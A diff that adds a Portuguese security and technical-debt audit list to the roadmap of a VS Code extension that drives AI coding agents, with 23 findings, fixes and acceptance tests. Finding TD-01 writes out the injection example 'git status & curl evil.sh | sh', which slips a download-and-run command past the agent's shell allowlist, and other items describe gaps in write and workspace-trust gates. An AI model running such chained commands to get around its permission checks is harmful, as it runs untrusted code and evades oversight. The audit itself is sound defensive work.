@@ -12,6 +12,176 @@
 
 ---
 
+## Débito Técnico & Correções de Segurança (Code Review Nov/2026)
+
+> Achados de auditoria completa de `extensions/tarot-core/src` e `media/webview` (`/code-review xhigh` + verificação manual de invariantes), cobrindo gaps, bugs e code smells acumulados desde o fork. **Prioridade sobre qualquer marco `M6.x` novo** até os itens `P0` serem corrigidos — nenhuma branch nova deve introduzir regressão nos itens já corrigidos (`✅`). Status: `📋 Pendente` → `✅ Corrigido`.
+
+| ID | Título | Categoria | Severidade | Arquivo | Status |
+| :--- | :--- | :--- | :---: | :--- | :--- |
+| **TD-01** | Bare `&` não separado em `parseShellCommand` permite bypass de política de shell | Segurança | **P0** | `permissions/shellParser.ts` | 📋 Pendente |
+| **TD-02** | Re-check de `fs_write` ausente em runs de Cron/Crew/DAG | Segurança | **P0** | `commands/scheduleAndLessonsCommands.ts`, `crewCommands.ts`, `subagentsPanel.ts` | 📋 Pendente |
+| **TD-03** | `tarot.workflows.runRecipe` roda sem checar Workspace Trust | Segurança | **P0** | `commands/workflowCommands.ts`, `views/recipesView.ts` | 📋 Pendente |
+| **TD-04** | Comandos de SSH/HTTP do Crew Automation sem checar Workspace Trust | Segurança | **P0** | `commands/crewAutomationCommands.ts` | 📋 Pendente |
+| **TD-05** | Checagem de raiz do workspace sem limite de separador de path | Segurança | **P0** | `checkpoints/checkpointService.ts` | 📋 Pendente |
+| **TD-06** | `activeProfileId` não é por sessão; fica obsoleto ao trocar de sessão | Correção | **P1** | `views/agentPanelView.ts` | 📋 Pendente |
+| **TD-07** | Descarte de review ignora `sessionId`, apaga review pendente de outra sessão | Correção | **P1** | `review/reviewSessionService.ts` | 📋 Pendente |
+| **TD-08** | `Object.entries()` em `Map` sempre vazio — output entre nós do DAG nunca é passado | Correção | **P1** | `views/subagentsPanel.ts` | 📋 Pendente |
+| **TD-09** | Re-run de review-loop corre risco de corrida com o próprio nó alvo | Correção | **P1** | `agents/subagentManager.ts` | 📋 Pendente |
+| **TD-10** | Branches paralelos de workflow sobrescrevem `run.status`/`pauseReason` compartilhado | Correção | **P1** | `workflows/workflowEngine.ts` | 📋 Pendente |
+| **TD-11** | Cron usa AND em vez de OR entre dia-do-mês/dia-da-semana | Correção | **P1** | `schedule/cronParser.ts` | 📋 Pendente |
+| **TD-12** | Dois prompts de Spec em inglês, violam regra PT-BR (`AGENTS.md` §2e) | Regra | **P1** | `specs/specService.ts` | 📋 Pendente |
+| **TD-13** | Parsing de status de worktree não trata renomes (`old -> new`) | Correção | **P1** | `git/worktreeManager.ts` | 📋 Pendente |
+| **TD-14** | `recipesByRunId` nunca é limpo — memory leak | Recurso | **P1** | `views/workflowRunEditor.ts` | 📋 Pendente |
+| **TD-15** | Listagem de digests ordena por nome do job, não por recência real | Correção | **P2** | `schedule/scheduleService.ts` | 📋 Pendente |
+| **TD-16** | Workspace Trust garantido só por convenção de comentário, não no código | Arquitetura | **P2** | `hooks/hookEngine.ts`, `skills/skillsService.ts`, `mcp/mcpConfigService.ts`, `agents/customAgentService.ts`, `workflows/recipeLoader.ts`, `powers/powersService.ts` | 📋 Pendente |
+| **TD-17** | `agentPanelView.ts` é um god object de ~2.100 linhas | Manutenibilidade | **P2** | `views/agentPanelView.ts` | 📋 Pendente |
+| **TD-18** | Helpers duplicados (`escapeHtml`/nonce/ID/`sanitizeSlug`/`readJsonSafe`) espalhados | Reuso | **P3** | múltiplos arquivos em `views/`, `hooks/`, `commands/` | 📋 Pendente |
+| **TD-19** | Lógica de `detect()` de adapter duplicada em 5 arquivos | Reuso | **P3** | `agents/adapters/*.ts` | 📋 Pendente |
+| **TD-20** | `await`s sequenciais que poderiam ser paralelos (`Promise.all`) | Eficiência | **P3** | `hookEngine.ts`, `turnContextBuilder.ts`, `reviewSessionService.ts`, `heartbeatService.ts` | 📋 Pendente |
+| **TD-21** | Sem cache de descoberta de `.tarot/{powers,skills,mcp}` por turno de chat | Eficiência | **P3** | `views/turnContextBuilder.ts` | 📋 Pendente |
+| **TD-22** | Trigger de review-loop baseado em substring é frágil | Qualidade | **P3** | `agents/subagentManager.ts` | 📋 Pendente |
+| **TD-23** | `setTimeout(400)` "mágico" no startup | Qualidade | **P3** | `extension.ts` | 📋 Pendente |
+
+### TD-01 — Bare `&` não separado em `parseShellCommand`
+
+**Problema**: `parseShellCommand` divide comandos compostos em `;`, `&&`, `||`, `|`, mas não em um `&` solto, deixando o comando injetado colado ao segmento anterior. Um preset como `git status*` casa com `^git status.*$` e aprova `git status & curl evil.sh | sh` como um único segmento; o shell real (`/bin/sh -c`) honra `&` como operador de sequência e executa o comando injetado.
+**Correção**: adicionar `&` (não precedido/seguido de `&`) como separador em `parseShellCommand`, e cobrir no mesmo teste o caso `cmd & cmd2`.
+**Critério de Aceite**: `git status & curl ...` é dividido em dois segmentos (`git status`, `curl ...`); o segundo nunca casa com um preset de leitura; teste de regressão cobrindo `&`, `&&`, `;`, `|`, `||` combinados.
+
+### TD-02 — Re-check de `fs_write` ausente em Cron/Crew/DAG
+
+**Problema**: `reviewFileWritesForTurn` (gate pós-turno de `fs_write`) só é chamado no fluxo de chat interativo (`agentPanelView.ts`); jobs agendados, Tarot Crew e DAG de sub-agentes chamam `adapter.run()` sem o re-check.
+**Correção**: extrair o gate para uma função compartilhada (`reviewFileWritesForTurn` em um módulo comum) e chamá-la após `adapter.run()` nos três call-sites restantes (`scheduleAndLessonsCommands.ts`, `crewCommands.ts`, `subagentsPanel.ts`).
+**Critério de Aceite**: uma regra `deny` de `fs_write` bloqueia/reverte a escrita também quando disparada por Schedule, Crew ou Subagent DAG; teste cobrindo os 4 call-sites.
+
+### TD-03 — `runRecipe` sem checar Workspace Trust
+
+**Problema**: `tarot.workflows.runRecipe` e o handler `'run'` de `recipesView.ts` executam passos de shell/agente sem checar `vscode.workspace.isTrusted`, diferente dos comandos irmãos no mesmo arquivo.
+**Correção**: adicionar o mesmo guard `if (!vscode.workspace.isTrusted) { return; }` no início de `runRecipe`/`executeWorkflowRun` e no handler `'run'` da webview.
+**Critério de Aceite**: `executeCommand('tarot.workflows.runRecipe', ...)` em workspace não confiável não executa nenhum passo; teste de regressão.
+
+### TD-04 — Comandos de SSH/HTTP do Crew Automation sem Workspace Trust
+
+**Problema**: `tarot.crew.remote.check` (spawna `ssh`) e `tarot.crew.gateway.testSend` (POST HTTP) não checam `isTrusted` no próprio comando, confiando apenas na tree view para filtrar argumentos.
+**Correção**: adicionar guard `isTrusted` no início de ambos os handlers de comando, igual aos comandos irmãos (`crew.apps.create`, `crew.gateway.configure`).
+**Critério de Aceite**: ambos os comandos recusam execução com `isTrusted === false`, independentemente da origem do argumento.
+
+### TD-05 — Checagem de raiz do workspace sem limite de separador
+
+**Problema**: `uri.fsPath.startsWith(workspaceRoot)` em `scanWorkspaceFingerprint`/`collectDirtyFiles` trata uma pasta irmã que compartilha o prefixo de string (`/app` vs `/app-staging`) como dentro do workspace, permitindo que `restoreCheckpoint` escreva fora da raiz real.
+**Correção**: usar `path.relative(workspaceRoot, fsPath)` e rejeitar quando o resultado começa com `..` ou é absoluto, em vez de `startsWith` puro (ou comparar com `workspaceRoot + path.sep`).
+**Critério de Aceite**: arquivo em pasta irmã (`/app-staging/x.ts` com root `/app`) é excluído do fingerprint/dirty-files; teste de regressão com pastas irmãs de prefixo comum.
+
+### TD-06 — `activeProfileId` obsoleto após troca de sessão
+
+**Problema**: `selectSession`/`openSessionById` restauram `mode`/`autonomy` da sessão alvo, mas nunca `activeProfileId`, então um turno pode rodar com tools/permissões/system-prompt de outro perfil.
+**Correção**: mover `activeProfileId` para dentro de `AgentSession` (persistido por sessão) ou resetá-lo para o perfil padrão da sessão alvo em todo handler de troca de sessão.
+**Critério de Aceite**: trocar de sessão A (perfil X) para sessão B restaura o perfil de B (ou o padrão), nunca o de A; teste cobrindo `selectSession` e `openSessionById`.
+
+### TD-07 — Descarte de review ignora `sessionId`
+
+**Problema**: `startReview` descarta o estado pendente comparando apenas `checkpointId`, não `sessionId`; trocar de aba de chat durante um review pendente de outra sessão o descarta silenciosamente.
+**Correção**: incluir `sessionId` na condição de descarte em `startReview`; só limpar o checkpoint/fechar tabs quando a nova review pertence à mesma sessão.
+**Critério de Aceite**: review pendente da sessão A sobrevive ao usuário trocar para a sessão B e rodar um turno lá; teste cobrindo duas sessões com reviews pendentes simultâneas.
+
+### TD-08 — `Object.entries(Map)` sempre vazio no DAG de sub-agentes
+
+**Problema**: `depOutputs` é um `Map`, mas `subagentsPanel.ts` usa `Object.entries(depOutputs)`, que sempre retorna `[]` para um `Map` — o contexto de dependência entre nós do DAG nunca é passado.
+**Correção**: trocar para `Array.from(depOutputs.entries())` (ou `[...depOutputs]`).
+**Critério de Aceite**: nó B com dependência no nó A recebe o output real de A no prompt; teste de regressão no DAG com dependência simples.
+
+### TD-09 — Corrida no review-loop de sub-agentes
+
+**Problema**: `validateSubagentDag` permite que `reviewLoop.target` aponte para um nó irmão na mesma onda (não dependência, não mútuo), permitindo que o re-run forçado corra com a execução concorrente normal do próprio nó alvo, corrompendo `resultsById`/`outputs`.
+**Correção**: exigir que `reviewLoop.target` esteja em uma onda estritamente anterior (já concluída) à do nó que o referencia; rejeitar na validação caso contrário.
+**Critério de Aceite**: DAG com `reviewLoop.target` na mesma onda é rejeitado na validação com mensagem clara; teste cobrindo onda anterior (permitido) vs mesma onda (rejeitado).
+
+### TD-10 — Branches paralelos de workflow sobrescrevem `run.status`
+
+**Problema**: branches paralelos mutam `run.status`/`run.pauseReason` diretamente dentro do mesmo `Promise.all`, sem coordenação; um branch pausado por `needs_input` pode ser sobrescrito por um branch que falha depois.
+**Correção**: usar uma fila/reducer de eventos por branch (cada branch retorna seu resultado em vez de mutar `run` direto) e aplicar prioridade explícita (`paused` > `failed` > `completed`) ao agregar o `joinPolicy: 'all'`.
+**Critério de Aceite**: branch A pausado + branch B falho (nesta ordem ou invertida) sempre resulta em `status: 'paused'` com `pauseReason` correto; teste cobrindo as duas ordens de conclusão.
+
+### TD-11 — Cron usa AND em vez de OR entre dom/dow
+
+**Problema**: `matchesCronAt` encadeia `&&` entre todos os campos, incluindo dia-do-mês e dia-da-semana, divergindo da semântica padrão de cron (quando ambos são restritos, deve ser OR).
+**Correção**: quando `domField !== '*'` e `dowField !== '*'`, usar `domMatched || dowMatched`; quando apenas um é restrito, manter AND normal com os demais campos.
+**Critério de Aceite**: `0 9 1 * MON` dispara no dia 1 **e** em toda segunda-feira; teste cobrindo os 4 casos (`*`/`*`, `*`/restrito, restrito/`*`, restrito/restrito).
+
+### TD-12 — Prompts de Spec em inglês (viola regra PT-BR)
+
+**Problema**: `buildTaskExecutionPrompt` e `buildPhaseAdvancePrompt` escrevem o prompt literal enviado ao CLI do agente em inglês, enquanto todos os demais builders do mesmo arquivo (e `BUNDLED_WORKFLOW_AGENT_PROMPTS`) estão em PT-BR, conforme exigido por `AGENTS.md` §2e.
+**Correção**: traduzir o texto literal de ambas as funções para PT-BR, mantendo apenas identificadores/código técnico em inglês.
+**Critério de Aceite**: nenhum texto em inglês nos prompts gerados por `specService.ts`; teste de snapshot/regex garantindo ausência de palavras-chave em inglês nos templates.
+
+### TD-13 — Parsing de worktree não trata renomes
+
+**Problema**: `applyWorktree` não trata o formato `old -> new` do `git status --porcelain` (diferente de `gitReviewService.ts`/`checkpointService.ts`, que já tratam), tornando o rename um path bugado que falha silenciosamente (`ENOENT` engolido).
+**Correção**: reaproveitar o mesmo parser de linha porcelain (`parsePorcelainStatusLine` ou equivalente) usado em `checkpointService.ts`, extraindo `oldPath`/`newPath` do formato de rename.
+**Critério de Aceite**: `git mv a.ts b.ts` dentro de um worktree é aplicado corretamente (b.ts criado, a.ts removido); teste de regressão com rename.
+
+### TD-14 — `recipesByRunId` nunca é limpo (memory leak)
+
+**Problema**: `recipesByRunId.set(...)` ocorre a cada abertura de run, mas, diferente do mapa irmão `panels`, nunca há `.delete()` correspondente — nem no dispose do panel nem no dispose do manager.
+**Correção**: chamar `recipesByRunId.delete(runId)` nos mesmos pontos em que `panels.delete(runId)` já é chamado.
+**Critério de Aceite**: após fechar N editores de workflow run, `recipesByRunId.size` volta a 0 (ou ao número de panels ainda abertos); teste de regressão verificando o tamanho do mapa.
+
+### TD-15 — Digests ordenados por nome, não por recência
+
+**Problema**: `listDigests` ordena nomes de arquivo (`${jobId}-${runId}.md`) com `.sort().reverse()` puro, agrupando por nome do job antes da recência real.
+**Correção**: extrair o timestamp real (do nome do arquivo ou `fs.stat().mtime`) e ordenar por ele, não pela string completa.
+**Critério de Aceite**: digests de jobs diferentes aparecem em ordem cronológica real na lista "recentes"; teste com 2+ jobs intercalados no tempo.
+
+### TD-16 — Workspace Trust garantido só por convenção
+
+**Problema**: `hookEngine.ts`, `skillsService.ts`, `mcpConfigService.ts`, `customAgentService.ts`, `recipeLoader.ts` e `powersService.ts` dependem de um comentário ("callers must gate...") em vez de checar `isTrusted` internamente; nenhum teste/guard de runtime impede um futuro call-site de esquecer o gate.
+**Correção**: cada serviço de descoberta passa a checar `vscode.workspace.isTrusted` internamente (ou recebe um `trusted: boolean` obrigatório no construtor/assinatura) e retorna vazio/no-op quando não confiável, como defesa em profundidade — sem remover os guards já existentes nos call-sites.
+**Critério de Aceite**: chamar qualquer `discover()` desses serviços num workspace não confiável retorna vazio mesmo sem guard externo; teste unitário por serviço simulando `isTrusted = false` sem guard no caller.
+
+### TD-17 — `agentPanelView.ts` é um god object
+
+**Problema**: ~2.100 linhas concentrando renderização de chat, slash commands, hooks/skills, seleção de modelo, contexto e sessão na mesma classe — como evidenciado pelo bug de estado compartilhado do TD-06.
+**Correção**: extrair responsabilidades autocontidas (ex.: dispatcher de slash commands, resolução de contexto, catálogo de perfis/skills) para colaboradores injetados, mantendo `AgentPanelView` como orquestrador fino. Fazer incrementalmente, sem quebrar a API pública da view.
+**Critério de Aceite**: pelo menos o dispatcher de slash commands e a resolução de catálogos dinâmicos (`refreshDynamicCatalogs`) vivem em módulos próprios testáveis isoladamente; suíte de testes existente continua verde.
+
+### TD-18 — Helpers duplicados
+
+**Problema**: `escapeHtml`, geração de nonce/ID, `sanitizeSlug`, `readJsonSafe` (e variantes) são reimplementados em múltiplos arquivos de `views/`, `hooks/` e `commands/` em vez de centralizados.
+**Correção**: consolidar em `extensions/tarot-core/src/common/{html,ids,fs}.ts` (ou pasta equivalente já existente) e substituir as duplicatas por import.
+**Critério de Aceite**: `rg` por `function escapeHtml|function sanitizeSlug|function readJsonSafe` retorna uma única definição de cada; testes existentes continuam passando.
+
+### TD-19 — `detect()` de adapter duplicado
+
+**Problema**: a lógica de detecção de binário/versão do CLI (`detect()`) é repetida com pequenas variações em 5 arquivos de `agents/adapters/`.
+**Correção**: extrair uma função utilitária compartilhada (`detectBinary(candidates, versionFlag)`) usada por todos os adapters, parametrizada pelas diferenças reais entre CLIs.
+**Critério de Aceite**: os 5 adapters chamam o mesmo utilitário; comportamento de detecção (caminho encontrado, versão, erro) inalterado para cada CLI nos testes existentes.
+
+### TD-20 — `await`s sequenciais que poderiam ser paralelos
+
+**Problema**: `hookEngine.ts`, `turnContextBuilder.ts`, `reviewSessionService.ts` e `heartbeatService.ts` fazem `await` sequencial em operações independentes (ex.: leituras de arquivo/discovery não relacionadas) quando `Promise.all` reduziria a latência percebida.
+**Correção**: identificar os `await`s sem dependência de dado entre si em cada arquivo e agrupá-los em `Promise.all`/`Promise.allSettled` (preservando ordem de erro quando relevante).
+**Critério de Aceite**: latência de abertura de turno (medida localmente) reduz nos 4 pontos identificados; nenhum teste de ordem de efeitos colaterais quebra.
+
+### TD-21 — Sem cache de descoberta `.tarot/{powers,skills,mcp}` por turno
+
+**Problema**: `turnContextBuilder.ts` chama `discover()` de powers/skills/mcp do zero em todo turno, mesmo quando `.tarot/` não mudou entre turnos da mesma sessão.
+**Correção**: cache em memória por workspace root com invalidação por `FileSystemWatcher` em `.tarot/{powers,skills,settings/mcp.json}` (mesma técnica já usada em outros watchers do projeto).
+**Critério de Aceite**: dois turnos consecutivos sem alteração em `.tarot/` reusam o resultado cacheado (verificável via contador de chamadas em teste); alteração de arquivo invalida o cache corretamente.
+
+### TD-22 — Trigger de review-loop baseado em substring
+
+**Problema**: o disparo do review-loop em `subagentManager.ts` depende de buscar uma substring mágica na saída do agente, frágil a variações de formatação/idioma do modelo.
+**Correção**: usar um marcador estruturado inequívoco (ex.: tag JSON/XML dedicada no fim do output, como já é feito em `workflowEngine.ts` para `[SEND_MESSAGE:...]`) em vez de substring livre.
+**Critério de Aceite**: trigger de review-loop não depende de texto natural do modelo; teste cobrindo variações de formatação de output que hoje poderiam falhar silenciosamente.
+
+### TD-23 — `setTimeout(400)` mágico no startup
+
+**Problema**: `extension.ts` usa um `setTimeout(400)` sem explicação para sequenciar inicialização, um número arbitrário que pode falhar em máquinas lentas ou desperdiçar tempo em rápidas.
+**Correção**: substituir pelo evento/`Promise` real que a espera de 400ms está tentando aguardar (ex.: `onDidChangeWorkspaceFolders`, conclusão de um `activate()` de dependência, ou callback de pronto).
+**Critério de Aceite**: inicialização não depende de um valor de tempo fixo; comportamento correto validado também sob *throttling* de CPU em teste manual.
+
+---
+
 ## Mapa Geral da Fase 6 (`M6.1–M6.34`)
 
 | Marco | Título | Inspiração | Prioridade | Dependências | Status |
